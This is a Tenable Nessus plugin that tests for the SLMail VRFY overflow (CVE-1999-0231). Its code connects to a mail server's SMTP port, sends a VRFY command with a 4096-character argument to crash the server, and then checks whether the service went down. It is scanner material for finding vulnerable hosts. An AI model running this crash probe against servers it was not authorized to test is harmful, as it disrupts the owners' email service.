#
# (C) Tenable Network Security, Inc.
#

include( 'compat.inc' );

if(description)
{
  script_id(10254);
  script_version ("$Revision: 1.22 $");
  script_cve_id("CVE-1999-0231");
  script_xref(name:"OSVDB", value:"5969");

  script_name(english:"SLMail VRFY Command Remote Overflow");
  script_summary(english:"VRFY aaaaa(...)aaa crashes the remote MTA");

  script_set_attribute(
    attribute:'synopsis',
    value:"The remote mail server is vulnerable to denial of service."
  );

  script_set_attribute(
    attribute:'description',
    value:"It was possible to perform a denial
of service against the remote SMTP server by
sending a too long argument to the VRFY command.

This problem allows an attacker to bring down
your mail system, preventing you from sending
and receiving emails."
  );

  script_set_attribute(
    attribute:'solution',
    value:"Update your MTA, or change it."
  );

  script_set_attribute(
    attribute:'see_also',
    value:"http://archives.neohapsis.com/archives/bugtraq/1998_1/0380.html"
  );

  script_set_attribute(
    attribute:'cvss_vector',
    value:'CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:P'
  );

  script_end_attributes();

 script_category(ACT_DENIAL);
 script_copyright(english:"This script is Copyright (C) 1999-2009 Tenable Network Security, Inc.");
 script_family(english:"SMTP problems");
 script_dependencie("find_service1.nasl", "smtpserver_detect.nasl", "sendmail_expn.nasl");
 script_exclude_keys("SMTP/wrapped");
 script_require_ports("Services/smtp", 25);
 exit(0);
}

#
# The script code starts here
#

include("global_settings.inc");

if (report_paranoia < 2) exit(0);

port = get_kb_item("Services/smtp");
if(!port)port = 25;
# Note that slmail is also vulnerable on port 27.
if (get_kb_item('SMTP/'+port+'/broken')) exit(0);
if(get_port_state(port))
{
 soc = open_sock_tcp(port);
 if(soc)
 {
  data = string("VRFY ", crap(4096), "\r\n");
  send(socket:soc, data:data);
  close(soc);
  soc2 = open_sock_tcp(port);
  if(!soc2)security_warning(port);
 }
}
